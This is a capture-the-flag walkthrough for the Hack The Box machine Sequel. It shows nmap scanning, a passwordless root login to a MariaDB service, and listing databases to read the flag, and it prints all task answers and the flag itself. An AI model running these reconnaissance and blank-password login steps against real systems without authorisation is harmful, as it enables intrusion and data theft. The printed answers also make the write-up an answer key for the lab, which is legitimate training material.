---
layout: default
title: Hack The Box Sequel
description: Walkthorugh/Writeup for Sequel, a Starting Point Hack The Box machine about MariaDB, an open-source DBMS
set: Starting Point
subset: Tier 1 - Fundamental Exploitation
order: 1
---

# [Sequel](https://app.hackthebox.com/machines/Sequel)<!-- omit in toc -->

This Hack The Box machine revolves around MariaDB, an [open-source](https://en.wikipedia.org/wiki/Open_source) [fork](https://www.geeksforgeeks.org/git/git-fork/) of [MySQL](https://www.mysql.com/).

### Table of contents:
- [Task 1](#task-1)
- [Task 2](#task-2)
- [Task 3](#task-3)
- [Task 4](#task-4)
- [Task 5](#task-5)
- [Task 6](#task-6)
- [Task 7](#task-7)
- [Submit Flag](#submit-flag)

## Task 1

*During our scan, which port do we find serving MySQL?*

This task wants us to run an [nmap](https://nmap.org/download) scan on the machine. Since the port we are looking for probably sits inside the [most used 1000 ports](https://nmap.org/book/man-port-specification.html), we don't need to specify any port range:

`nmap target-ip-here`

This will return:

```
PORT     STATE SERVICE
3306/tcp open  mysql
```

This means that mysql is running on port

>`3306`

## Task 2

*What community-developed MySQL version is the target running?*

We can answer this question by running a more in-depth nmap scan. Lets's try [`-sV`](https://nmap.org/book/man-version-detection.html) (service version):

`nmap target-ip-here -sV`

This will return

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
```

This is still not enough. We need to fin the exact version of MySQL that is running. We can get more details by using the `-sC` flag (equal to `--script=default`), which will activate the [NSE (Nmap Scripting Engine)](https://nmap.org/book/nse.html) and its' most basic scans. This will return:

```
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 68
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, ConnectWithDatabase, ODBCClient, IgnoreSigpipes, InteractiveClient, FoundRows, Speaks41ProtocolNew, SupportsTransactions, SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: y7E3q`m"`=NR1>#3uws]
|_  Auth Plugin Name: mysql_native_password
```

This means that the machine is running

>MariaDB

## Task 3

*When using the MySQL command line client, what switch do we need to use in order to specify a login username?*

According to the MySQL manual (get it from running `man mysql`):

```
--user=user_name, -u user_name

           The MariaDB user name to use when connecting to the server.
```

This means that to login with a username we'll need to use

>`-u`

## Task 4

*Which username allows us to log into this MariaDB instance without providing a password?*

Let's try standard usernames: `admin` and `root`

```
mysql -u admin -h 10.129.93.99 -P 3306
```

This will return

```
ERROR 1045 (28000): Access denied for user 'admin'@'10.10.14.42
```

Now with `root`

```
mysql -u root -h 10.129.93.99 -P 3306
```

This will return

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
```

and a shell to enter commands: `MariaDB [(none)]>`

## Task 5

*In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?*

To display anything inside a table, we need to run `SELECT * FROM table;` That means that the

>`*`

symbol stands for "everything".

## Task 6

*In SQL, what symbol do we need to end each query with?*

As we saw in the last task, each query needs to end with

>`;`

## Task 7

*There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?*

To list all databases in this MySQL instance we need to run `SHOW DATABASES;`

This will return:

```
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

`information_schema`, `mysql` and `performance_schema` are standard databases. The only custom one is

>`htb`

## Submit Flag

*Submit root flag*

We now have to list the contents of a table. However, before we do that, we need to list all tables. First, select the `htb` database with `USE htb`, then display all of the tables in that database with `SHOW TABLES;`

This will return

```
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Let's read everything in the first one with `SELECT * FROM config`

This will return

```
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

This means that the flag is

>7b4bec00d1a39e3dd4e021ec3d915da8